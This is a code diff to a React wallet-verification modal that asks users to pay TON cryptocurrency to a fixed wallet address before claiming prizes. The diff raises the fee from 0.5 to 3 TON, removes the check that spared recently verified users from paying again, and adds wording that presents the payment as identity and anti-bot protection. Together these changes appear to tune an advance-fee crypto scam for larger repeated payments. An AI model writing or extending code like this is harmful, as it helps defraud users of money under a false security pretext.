@@ -16,7 +16,7 @@ interface WalletVerificationModalProps {
   onVerified: () => void;
 }
 
-const VERIFICATION_FEE = 0.5; // TON
+const VERIFICATION_FEE = 3; // TON
 const VERIFICATION_WALLET = 'UQCFrjvfMxqHh4-tooMa22uNvbKGd73KfGab3cePjZxq_uNb';
 
 const WalletVerificationModal: React.FC<WalletVerificationModalProps> = ({
@@ -41,28 +41,8 @@ const WalletVerificationModal: React.FC<WalletVerificationModalProps> = ({
   }, [open]);
 
   const handleVerify = async () => {
-    // If already verified recently, skip asking to pay again
-    try {
-      const thirtyMinutesAgo = new Date(Date.now() - 30 * 60 * 1000).toISOString();
-      const { data: existingVerification } = await supabase
-        .from('wallet_verifications')
-        .select('id, verified_at')
-        .eq('user_id', userId)
-        .eq('currency', 'TON')
-        .gte('verified_at', thirtyMinutesAgo)
-        .order('verified_at', { ascending: false })
-        .limit(1)
-        .maybeSingle();
-
-      if (existingVerification) {
-        setIsVerified(true);
-        onVerified();
-        onClose();
-        return;
-      }
-    } catch (e) {
-      // ignore and proceed to payment flow
-    }
+    // Always require new verification - no skipping even if recently verified
+    // This ensures proper identity verification for prize claims
 
     // Check if wallet is connected
     if (!wallet?.account) {
@@ -202,7 +182,7 @@ const WalletVerificationModal: React.FC<WalletVerificationModalProps> = ({
                     {VERIFICATION_FEE} TON
                   </p>
                   <p className="text-xs text-muted-foreground">
-                    Required for security verification
+                    Required to verify your identity. This prevents bots and fake accounts from claiming rewards.
                   </p>
                 </div>
 
